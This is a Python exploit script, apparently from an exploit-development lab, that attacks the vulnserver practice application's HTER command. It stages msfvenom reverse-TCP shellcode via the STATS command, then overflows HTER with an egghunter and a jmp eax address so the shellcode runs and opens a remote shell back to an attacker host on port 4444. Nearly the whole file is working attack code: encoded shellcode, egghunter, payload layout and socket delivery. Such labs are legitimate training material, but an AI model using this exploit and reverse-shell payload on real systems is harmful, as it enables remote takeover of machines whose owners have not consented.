#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM
from struct import pack
from sys import exit

rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)


# Because what we send is directly seen in hex, we do not send this as bytes
# we send this as the raw hex
egghunter = ""
egghunter += "6681caff0f42526a0258cd2e3c055a74"
egghunter += "efb8773030748bfaaf75eaaf75e7ffe7"

# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.153.133 LPORT=4444 -v shellcode -f python -b '\x00' -a x86 --platform windows
# x86/shikata_ga_nai chosen with final size 351
# Payload size: 351 bytes
shellcode =  "w00tw00t"
shellcode += "\xda\xc0\xba\x78\xa7\xd9\x94\xd9\x74\x24\xf4\x5f"
shellcode += "\x33\xc9\xb1\x52\x83\xc7\x04\x31\x57\x13\x03\x2f"
shellcode += "\xb4\x3b\x61\x33\x52\x39\x8a\xcb\xa3\x5e\x02\x2e"
shellcode += "\x92\x5e\x70\x3b\x85\x6e\xf2\x69\x2a\x04\x56\x99"
shellcode += "\xb9\x68\x7f\xae\x0a\xc6\x59\x81\x8b\x7b\x99\x80"
shellcode += "\x0f\x86\xce\x62\x31\x49\x03\x63\x76\xb4\xee\x31"
shellcode += "\x2f\xb2\x5d\xa5\x44\x8e\x5d\x4e\x16\x1e\xe6\xb3"
shellcode += "\xef\x21\xc7\x62\x7b\x78\xc7\x85\xa8\xf0\x4e\x9d"
shellcode += "\xad\x3d\x18\x16\x05\xc9\x9b\xfe\x57\x32\x37\x3f"
shellcode += "\x58\xc1\x49\x78\x5f\x3a\x3c\x70\xa3\xc7\x47\x47"
shellcode += "\xd9\x13\xcd\x53\x79\xd7\x75\xbf\x7b\x34\xe3\x34"
shellcode += "\x77\xf1\x67\x12\x94\x04\xab\x29\xa0\x8d\x4a\xfd"
shellcode += "\x20\xd5\x68\xd9\x69\x8d\x11\x78\xd4\x60\x2d\x9a"
shellcode += "\xb7\xdd\x8b\xd1\x5a\x09\xa6\xb8\x32\xfe\x8b\x42"
shellcode += "\xc3\x68\x9b\x31\xf1\x37\x37\xdd\xb9\xb0\x91\x1a"
shellcode += "\xbd\xea\x66\xb4\x40\x15\x97\x9d\x86\x41\xc7\xb5"
shellcode += "\x2f\xea\x8c\x45\xcf\x3f\x02\x15\x7f\x90\xe3\xc5"
shellcode += "\x3f\x40\x8c\x0f\xb0\xbf\xac\x30\x1a\xa8\x47\xcb"
shellcode += "\xcd\x7b\x87\x4a\x88\xec\xaa\x6c\x82\xb0\x23\x8a"
shellcode += "\xce\x58\x62\x05\x67\xc0\x2f\xdd\x16\x0d\xfa\x98"
shellcode += "\x19\x85\x09\x5d\xd7\x6e\x67\x4d\x80\x9e\x32\x2f"
shellcode += "\x07\xa0\xe8\x47\xcb\x33\x77\x97\x82\x2f\x20\xc0"
shellcode += "\xc3\x9e\x39\x84\xf9\xb9\x93\xba\x03\x5f\xdb\x7e"
shellcode += "\xd8\x9c\xe2\x7f\xad\x99\xc0\x6f\x6b\x21\x4d\xdb"
shellcode += "\x23\x74\x1b\xb5\x85\x2e\xed\x6f\x5c\x9c\xa7\xe7"
shellcode += "\x19\xee\x77\x71\x26\x3b\x0e\x9d\x97\x92\x57\xa2"
shellcode += "\x18\x73\x50\xdb\x44\xe3\x9f\x36\xcd\x13\xea\x1a"
shellcode += "\x64\xbc\xb3\xcf\x34\xa1\x43\x3a\x7a\xdc\xc7\xce"
shellcode += "\x03\x1b\xd7\xbb\x06\x67\x5f\x50\x7b\xf8\x0a\x56"
shellcode += "\x28\xf9\x1e"

def validate_len(payload):
    exploit_len = 5000
    payload_len = len(payload)
    if payload_len != exploit_len:
        print('[!] Payload was length {pl}, expected {el}'.format(
            pl=payload_len, el=exploit_len))
        exit(1)


if __name__ == '__main__':
    print('[*] building payload and running validations')
    payload = "HTER 0"
    # overwrote EIP with CDABCDAB - note the capitalization, whcih we didn't send
    payload += "90" * 20
    payload += egghunter
    payload += "90" * ((2040 - 40 - len(egghunter)) / 2)
    # Message=  0x625011b1 : jmp eax |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\SharedWithVM\vulnerable-apps\vulnserver\essfunc.dll)
    payload += "b1115062"
    payload += "A" * (2944)
    payload += "\r\n"
    validate_len(payload)
    print('[*] validations passed')
    print('[+] sending shellcode for egghunter to find')
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(target)
    s.recv(1024)
    s.send("STATS " + shellcode)
    s.recv(1024)
    s.close()
    print('[+] stage 2 payload sent')
    print('[*] connecting to target')
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(target)
    print('[*] connected. waiting for welcome message')
    welcome = s.recv(1024)
    print('[*] received message:\n\t{msg}'.format(msg=welcome))
    print('[*] sending payload')
    s.send(payload)
    print('[*] B00M! egghunter should be running...')
    s.close()
